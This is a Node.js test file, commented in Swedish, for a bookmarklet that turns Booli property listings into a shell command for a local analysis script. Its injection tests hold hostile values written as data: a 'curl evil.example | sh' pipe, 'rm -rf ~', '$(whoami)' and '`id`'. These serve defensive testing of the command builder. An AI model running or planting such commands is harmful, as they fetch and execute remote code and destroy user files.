// Tester för bokmärket, utan webbläsare och utan tillägg.
// Kör: node bokmarke/test_bokmarke.js
//
// Testar det som inte behöver en riktig sida: sidtyp, tvättning av adress,
// kommandobygget (inklusive försök att smyga in skalkommandon) och att
// bokmärket i installera.html avkodas till exakt källkoden.
// Utläsningen ur Booli-sidorna (lasAnnons, lasForeningPdf) testas manuellt i webbläsaren.

"use strict";
const fs = require("fs");
const path = require("path");
const vm = require("vm");

const MAPP = __dirname;
const kallkod = fs.readFileSync(path.join(MAPP, "bostadsanalys.js"), "utf8");

// Ladda bokmärket i testläge – det lämnar då ut sina funktioner i stället för att köras
let f = null;
vm.runInNewContext(kallkod, { window: { __BOSTADSANALYS_TEST__: (funktioner) => { f = funktioner; } }, URL });

let godkanda = 0, totalt = 0;
function lika(namn, fick, forvantat) {
  totalt++;
  if (JSON.stringify(fick) === JSON.stringify(forvantat)) {
    godkanda++;
    console.log(`  ✅ ${namn}`);
  } else {
    console.log(`  ❌ ${namn}\n       förväntat: ${JSON.stringify(forvantat)}\n       fick:      ${JSON.stringify(fick)}`);
  }
}

console.log("Sidtyp");
lika("annons /bostad/<id>", f.sidtyp("https://www.booli.se/bostad/684022"), "annons");
lika("annons /annons/<id> med parametrar", f.sidtyp("https://www.booli.se/annons/123?x=1#y"), "annons");
lika("annons med avslutande /", f.sidtyp("https://www.booli.se/bostad/684022/"), "annons");
lika("föreningssida", f.sidtyp("https://www.booli.se/bostadsrattsforening/46088"), "forening");
lika("annan sida på Booli", f.sidtyp("https://www.booli.se/sok/till-salu"), "annat");
lika("annan domän med samma sökväg", f.sidtyp("https://evil.example/bostad/684022"), "annat");
lika("liknande domän (booli.se.evil.example)", f.sidtyp("https://booli.se.evil.example/bostad/1"), "annat");

console.log("\nTvättning av adress");
lika("vanlig adress oförändrad", f.tvattaAdress("Norra Stationsgatan 117"), "Norra Stationsgatan 117");
lika("åäö, komma, punkt och bindestreck behålls", f.tvattaAdress("Östermalmsg. 3-5, Gärdet"), "Östermalmsg. 3-5, Gärdet");
lika("skaltecken tas bort", f.tvattaAdress("Gata 1'; rm -rf ~ #`$(x)`"), "Gata 1 rm -rf x");
lika("radbrytning blir mellanslag", f.tvattaAdress("Gata 1\nlgh 1101"), "Gata 1 lgh 1101");
lika("upphöjd tvåa tas bort", f.tvattaAdress("63 m²"), "63 m");
lika("max 100 tecken", f.tvattaAdress("a".repeat(150)).length, 100);
lika("bara otillåtna tecken → null", f.tvattaAdress("'$;`"), null);

console.log("\nKommandobygge");
const PDF = "https://documents.bcdn.se/c0/39/6db004c20371/A_rsredovisning_2024_BRF_Ska_len_16-17.pdf";
const BAS = "cd ~/Projects/bostadsanalys && venv/bin/python analysera.py '" + PDF + "'";
const annons = {
  annons_url: "https://www.booli.se/bostad/684022", adress: "Norra Stationsgatan 117",
  pris: "5995000", avgift: "4648", rum: "2", kvm: "63",
};
lika("fullständigt kommando", f.byggKommando(PDF, annons),
  BAS + " --annons 'https://www.booli.se/bostad/684022' --adress 'Norra Stationsgatan 117'" +
  " --pris '5995000' --avgift '4648' --rum '2' --kvm '63'");
lika("utan annons", f.byggKommando(PDF, null), BAS);
lika("talformat från sidan tolkas", f.byggKommando(PDF, { ...annons, pris: "5 995 000 kr", rum: "2,5 rum", kvm: "63,5 m²" }),
  BAS + " --annons 'https://www.booli.se/bostad/684022' --adress 'Norra Stationsgatan 117'" +
  " --pris '5995000' --avgift '4648' --rum '2.5' --kvm '63.5'");
lika("ogiltiga/saknade tal utelämnas", f.byggKommando(PDF, { ...annons, pris: "Pris saknas", avgift: null, rum: "0", kvm: undefined }),
  BAS + " --annons 'https://www.booli.se/bostad/684022' --adress 'Norra Stationsgatan 117'");
lika("annons-URL med parametrar → ingen annonsdel", f.byggKommando(PDF, { ...annons, annons_url: "https://www.booli.se/bostad/684022?x=1" }), BAS);
lika("annons-URL på annan domän → ingen annonsdel", f.byggKommando(PDF, { ...annons, annons_url: "https://evil.example/bostad/1" }), BAS);
lika("PDF med citattecken avvisas", f.byggKommando("https://documents.bcdn.se/a'b.pdf", annons), null);
lika("PDF med parametrar avvisas", f.byggKommando(PDF + "?next=x", annons), null);
lika("PDF på annan domän avvisas", f.byggKommando("https://evil.example/a.pdf", annons), null);
lika("PDF över http avvisas", f.byggKommando(PDF.replace("https", "http"), annons), null);
lika("PDF med mellanslag avvisas", f.byggKommando("https://documents.bcdn.se/a b.pdf", annons), null);

// Inget värde får kunna bryta sig ur sina citattecken, oavsett vad sidan innehåller
const elakt = {
  annons_url: "https://www.booli.se/bostad/1", adress: "x'; curl evil.example | sh; echo '",
  pris: "1'; rm -rf ~; '", avgift: "$(whoami)", rum: "`id`", kvm: "1;2",
};
const kommando = f.byggKommando(PDF, elakt);
const varden = kommando.slice(BAS.length).match(/'[^']*'/g) || [];
lika("elak indata: jämnt antal citattecken", (kommando.match(/'/g) || []).length % 2, 0);
lika("elak indata: inga skaltecken utanför citattecken",
  /[;|&$`<>(){}\\]/.test(kommando.slice(BAS.length).replace(/'[^']*'/g, "")), false);
lika("elak indata: inga skaltecken inuti värdena", varden.some((v) => /[;|&$`'"\\]/.test(v.slice(1, -1))), false);

console.log("\ninstallera.html");
const sida = fs.readFileSync(path.join(MAPP, "installera.html"), "utf8");
const href = (sida.match(/href="(javascript:[^"]*)"/) || [])[1] || "";
const avkodad = decodeURIComponent(href.slice("javascript:".length).replace(/&amp;/g, "&"));
lika("bokmärket avkodas till exakt källkoden", avkodad === kallkod, true);

console.log(`\n${godkanda}/${totalt} tester godkända`);
process.exit(godkanda === totalt ? 0 : 1);
